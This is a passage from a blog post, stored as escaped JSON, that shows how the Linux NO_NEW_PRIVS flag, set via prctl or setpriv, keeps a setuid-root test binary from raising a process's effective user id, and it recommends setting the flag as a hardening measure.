effective user. Let’s take a look in both binaries, starting from caller:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/prctl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(int argc, char **argv) { if (argc != 3) errx(0, \u0026#34;Usage: %s \u0026lt;0|1\u0026gt; \u0026lt;path to binary\u0026gt;\u0026#34;, argv[0]); if (!strncmp(argv[1], \u0026#34;1\u0026#34;, 1) \u0026amp;\u0026amp; prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1) errx(1, \u0026#34;no_new_privs failed\u0026#34;); execlp(argv[2], argv[2], NULL); err(1, \u0026#34;execlp\u0026#34;); } The first binary, caller, will receive two parameters, the first one specifies if the user wants to set the NO_NEW_PRIVS flag, and the second one receives a path to the binary we want to execute. After compiling getuid, we need to change the owner, and turn on the setuid bit of the resulting binary:\n1 2 3 $ gcc getuid.c -o getuid $ sudo chown root:root getuid $ sudo chmod +s getuid Now, let’s make use of both binaries. Let’s assume you have them in the same directory. First, without setting NO_NEW_PRIVS:\n1 2 $ ./caller 0 ./getuid euid: 0 As expected, the printed effective user id is 0, meaning that we are root, thanks to the setuid bit being set and the owner of the binary being root. What happens when we turn on the NO_NEW_PRIVS flag in caller?\n1 2 $ ./caller 1 ./getuid euid: 1000 As expected, the effective user id is the one who executes caller, so, no privileges were escalated.\nWe can also exemplify this behavior using setpriv, which is part of util-linux, to test the NO_NEW_PRIVS flag. Take a look below:\n1 2 3 4 $ setpriv ./getuid euid: 0 $ setpriv --no-new-privs ./getuid euid: 1000 As you can see, the output is the same from the caller, as it uses the same feature to avoid privilege escalation.\nSo, the general suggestion is: always set NO_NEW_PRIVS whenever you don’t need “new privileges” to be added to your process.\nSee you next time!\n","permalink":"https://mpdesouza.com/blog/no_new_privs-avoiding-privilege-escalation/","summary":"\u0026hellip; or how to avoid turning your app into an exploit.","title":"NO_NEW_PRIVS: avoiding privilege escalation"}]